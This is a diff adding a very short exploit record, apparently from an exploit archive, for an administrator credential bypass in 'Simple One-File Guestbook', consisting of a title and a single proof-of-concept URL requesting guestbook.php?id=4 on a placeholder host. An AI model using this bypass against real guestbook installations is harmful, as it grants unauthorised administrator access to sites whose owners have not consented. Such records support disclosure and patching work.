@@ -1,0 +1,4 @@
+#Simple One-File Guestbook Adminstrator Credential Bypass
+#Proof of Concept URL
+
+http://www.example.com/[path]/guestbook.php?id=4 
